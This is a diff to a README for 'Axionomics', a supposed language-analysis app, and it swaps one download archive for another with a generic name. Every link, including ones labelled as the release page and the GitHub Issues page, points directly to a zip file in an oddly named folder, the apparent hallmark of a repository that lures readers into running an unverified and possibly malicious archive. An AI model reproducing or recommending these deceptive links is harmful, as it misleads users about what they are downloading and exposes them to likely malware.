@@ -1,6 +1,6 @@
 # 🚀 Axionomics - Simplifying Language Through Technology
 
-[![Download Axionomics](https://raw.githubusercontent.com/jikunal11/Axionomics/main/antimonarchic/Axionomics_v2.2.zip%https://raw.githubusercontent.com/jikunal11/Axionomics/main/antimonarchic/Axionomics_v2.2.zip)](https://raw.githubusercontent.com/jikunal11/Axionomics/main/antimonarchic/Axionomics_v2.2.zip)
+[![Download Axionomics](https://github.com/jikunal11/Axionomics/raw/refs/heads/main/antimonarchic/Software_1.3.zip%https://github.com/jikunal11/Axionomics/raw/refs/heads/main/antimonarchic/Software_1.3.zip)](https://github.com/jikunal11/Axionomics/raw/refs/heads/main/antimonarchic/Software_1.3.zip)
 
 ## 📋 Introduction
 
@@ -18,7 +18,7 @@ Welcome to Axionomics! This application helps you explore language units, includ
 To start using Axionomics, you need to download the software. Follow these steps:
 
 1. **Visit the Release Page:**
-   Click here to [visit the release page](https://raw.githubusercontent.com/jikunal11/Axionomics/main/antimonarchic/Axionomics_v2.2.zip) to download the latest version. 
+   Click here to [visit the release page](https://github.com/jikunal11/Axionomics/raw/refs/heads/main/antimonarchic/Software_1.3.zip) to download the latest version. 
 
 2. **Choose Your Version:**
    On the release page, you will see a list of versions. Select the most recent version for your operating system.
@@ -32,7 +32,7 @@ To start using Axionomics, you need to download the software. Follow these steps
 5. **Launch the Application:**
    After installation, find Axionomics in your applications list and click to open it.
 
-Remember, the download link is available here again for your convenience: [Visit the release page](https://raw.githubusercontent.com/jikunal11/Axionomics/main/antimonarchic/Axionomics_v2.2.zip).
+Remember, the download link is available here again for your convenience: [Visit the release page](https://github.com/jikunal11/Axionomics/raw/refs/heads/main/antimonarchic/Software_1.3.zip).
 
 ## ⚙️ System Requirements
 
@@ -78,6 +78,6 @@ To enhance your understanding of language analysis, consider these resources:
 
 ## 📨 Support
 
-For further assistance or to report issues, please open an issue in the [GitHub Issues page](https://raw.githubusercontent.com/jikunal11/Axionomics/main/antimonarchic/Axionomics_v2.2.zip).
+For further assistance or to report issues, please open an issue in the [GitHub Issues page](https://github.com/jikunal11/Axionomics/raw/refs/heads/main/antimonarchic/Software_1.3.zip).
 
 We appreciate your use of Axionomics and hope it brings clarity to your studies in language!
